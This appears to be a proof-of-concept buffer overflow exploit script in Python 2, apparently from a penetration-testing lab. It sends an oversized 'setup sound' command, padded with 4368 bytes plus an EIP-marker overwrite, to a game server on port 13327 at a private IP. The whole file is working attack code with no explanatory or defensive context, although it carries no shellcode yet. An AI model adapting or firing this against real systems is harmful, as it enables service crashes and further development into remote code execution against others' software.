#!/usr/bin/python
import socket

host = "10.11.0.128"

crash = "\x41" * 4368 + "B" * 4 + "C" * 7

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
